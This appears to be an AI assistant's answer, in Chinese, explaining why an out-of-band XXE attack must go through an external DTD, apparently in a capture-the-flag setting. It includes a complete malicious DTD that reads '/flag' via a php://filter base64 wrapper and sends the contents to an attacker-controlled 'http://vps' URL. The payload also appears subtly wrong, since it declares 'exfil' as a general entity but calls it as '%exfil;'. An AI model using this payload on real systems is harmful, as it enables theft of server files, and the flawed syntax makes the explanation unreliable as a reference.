这是一个很好的问题，涉及 DTD（文档类型定义）的解析规则。

## 核心原因：参数实体不能在内部 DTD 子集中直接嵌套引用

### 你想做的事（直接展开）

```xml
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://vps/?d=%file;'>">
```

这里想让 `%file;` 在 `oob` 的**定义值字符串内部**直接展开，但这违反了 XML 规范。

---

### XML 规范的限制

**XML 1.0 规范明确规定：**

> 在内部 DTD 子集中，参数实体引用（`%name;`）**不能出现在标记声明内部**。

也就是说，`%file;` 出现在 `<!ENTITY ...>` 声明的**引号字符串里面**时，解析器**不会展开它**，而是把 `%file;` 当作字面字符串处理。

### 对比两种情况

|位置|`%file;` 是否展开|
|---|---|
|DTD 声明**之间**（顶层）|✅ 展开|
|DTD 声明**内部**（引号里）|❌ 不展开（内部 DTD 子集）|
|**外部 DTD** 声明内部|✅ 展开 ← 利用点在此|

---

### 为什么用外部 DTD 就能绕过

OOB XXE 的完整流程：

```
攻击者 XML 里 --引用--> 外部 DTD（你的 VPS）
                              ↓
               外部 DTD 里定义 %file; 和 %oob;
               在外部 DTD 的"顶层"调用 %file;
                              ↓
                    %file; 在此处合法展开
                    拼入 exfil 实体的 URL 中
```

**外部 DTD 文件内容（hosted on VPS）：**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://vps/?d=%file;'>">
%oob;
%exfil;
```

这里 `%file;` 出现在**外部 DTD 的顶层参数实体定义**中，XML 解析器**允许**在这个上下文中展开它，所以 `exfil` 的 URL 里就能拿到文件内容。

---

### 一句话总结

`%file;` 写在 `%oob` 定义的引号里 → 内部 DTD 子集 → XML 规范禁止在声明内部展开参数实体 → **必须借助外部 DTD** 来让这个嵌套展开合法发生。
